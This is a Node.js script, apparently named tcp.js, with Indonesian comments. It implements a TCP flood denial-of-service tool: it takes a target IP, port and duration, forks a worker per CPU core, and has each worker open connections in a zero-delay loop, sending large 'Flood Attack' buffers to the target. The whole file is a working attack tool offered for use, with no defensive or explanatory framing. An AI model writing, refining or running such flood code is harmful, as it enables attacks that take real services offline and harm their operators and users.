const net = require('net');
const cluster = require('cluster');
const os = require('os');
const numCPUs = os.cpus().length;
const fs = require('fs');
const readline = require('readline');

const targetIP = process.argv[2];   // IP dari parameter pertama
const targetPort = process.argv[3]; // Port dari parameter kedua
const duration = parseInt(process.argv[4], 10) * 1000; // Durasi dalam detik
const packetSize = parseInt(process.argv[5], 10) || 65500; // Ukuran paket (default 65500 byte)
const logFile = process.argv[6] || 'flood.log'; // File log (default flood.log)

const message = Buffer.alloc(packetSize, 'Flood Attack'); // Buffer dengan ukuran packetSize byte

let packetsSent = 0;
let startTime = Date.now();

function log(message) {
    const timestamp = new Date().toISOString();
    console.log(`${timestamp} - ${message}`);
    fs.appendFile(logFile, `${timestamp} - ${message}\n`, (err) => {
        if (err) {
            console.error(`Error writing to log file: ${err.message}`);
        }
    });
}

function usage() {
    console.log('Usage: node tcp.js <targetIP> <targetPort> <duration> [packetSize] [logFile]');
    process.exit(1);
}

if (!targetIP || !targetPort || !duration) {
    usage();
}

if (cluster.isMaster) {
    log(`Starting flood attack on ${targetIP}:${targetPort} for ${duration / 1000} seconds`);
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        log('Flood attack finished');
        process.exit(0);
    }, duration); // Stop after the duration

    process.on('SIGINT', () => {
        log('Flood attack interrupted');
        process.exit(0);
    });
} else {
    function flood() {
        const client = new net.Socket();
        client.connect(targetPort, targetIP, () => {
            client.write(message); // Kirim pesan dengan ukuran packetSize byte
            packetsSent++;
            log(`Sent packet ${packetsSent}`);
        });

        client.on('error', (err) => {
            log(`Error: ${err.message}`);
            client.destroy();
        });

        client.on('close', () => {
            log(`Connection closed`);
        });
    }

    setInterval(flood, 0); // Kirim paket terus-menerus
}
